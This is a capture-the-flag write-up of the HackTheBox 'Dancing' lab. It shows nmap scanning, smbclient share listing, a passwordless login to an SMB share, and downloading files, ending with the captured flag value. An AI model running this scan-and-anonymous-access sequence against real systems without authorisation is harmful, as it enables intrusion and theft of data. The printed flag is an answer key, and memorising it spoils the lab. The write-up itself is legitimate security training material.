# HackTheBox Dancing Box
Starting Point
2024-11-08

## Lab Setup

Downloaded OpenVPN file

Connected from Kali using command `openvpn /mnt/C/Users/Jonathan/Downloads/starting_point_jcaruso.ovpn`

VPN is not running as daemon

Opened second terminal and ran `kali`

Pinged 10.129.67.144 to confirm connectivity

`ping 10.129.67.144`

PING 10.129.67.144 (10.129.67.144) 56(84) bytes of data.

64 bytes from 10.129.67.144: icmp_seq=1 ttl=127 time=46.2 ms

64 bytes from 10.129.67.144: icmp_seq=2 ttl=127 time=47.2 ms

64 bytes from 10.129.67.144: icmp_seq=3 ttl=127 time=1371 ms

64 bytes from 10.129.67.144: icmp_seq=4 ttl=127 time=316 ms

64 bytes from 10.129.67.144: icmp_seq=5 ttl=127 time=49.8 ms

64 bytes from 10.129.67.144: icmp_seq=6 ttl=127 time=45.9 ms

64 bytes from 10.129.67.144: icmp_seq=7 ttl=127 time=52.2 ms


--- 10.129.67.144 ping statistics ---

7 packets transmitted, 7 received, 0% packet loss, time 6062ms

rtt min/avg/max/mdev = 45.857/275.378/1370.873/456.647 ms, pipe 2


SMB = Server Message Block
Port 445 TCP
SMB storage = share
Transport layer for Microsoft SMB most often used with is NetBIOS over TCP/IP (NBT) port 139

Usually requires credentials
Can allow login with guest accounts or anonymous accounts if configured insecurely

## Enumeration

### Port scanning with nmap

`sudo nmap -sV 10.129.67.144`

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 12:29 EST
Nmap scan report for 10.129.67.144
Host is up (0.051s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds

### Listing shares with smbclient

`smbclient -L 10.129.67.144`
Password for [WORKGROUP\****]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.67.144 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

Trying to connect to ADMIN$ and C$

`smbclient \\\\10.129.67.144\\ADMIN$`
Password for [WORKGROUP\****]:
tree connect failed: NT_STATUS_ACCESS_DENIED

`smbclient \\\\10.129.67.144\\C$`
Password for [WORKGROUP\****]:
tree connect failed: NT_STATUS_ACCESS_DENIED

## Foothold

`smbclient \\\\10.129.67.144\\WorkShares`
Password for [WORKGROUP\****]:
Try "help" to get a list of possible commands.
smb: \>

Successful connection to WorkShares with no password

### Listing directories and files

smb: \> `ls`
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021
  
### Downloading available files

smb: \> `cd Amy.J\`
smb: \Amy.J\> `get worknotes.txt`
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \Amy.J\> `cd ..`
smb: \> cd James.P\
smb: \James.P\> `dir`
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1733376 blocks available
smb: \James.P\> `get flag.txt`
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \James.P\> `exit`

## Flag Captured!

`cat worknotes.txt`
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
`cat flag.txt`
5f61c10dffbc77a704d76016a22f1664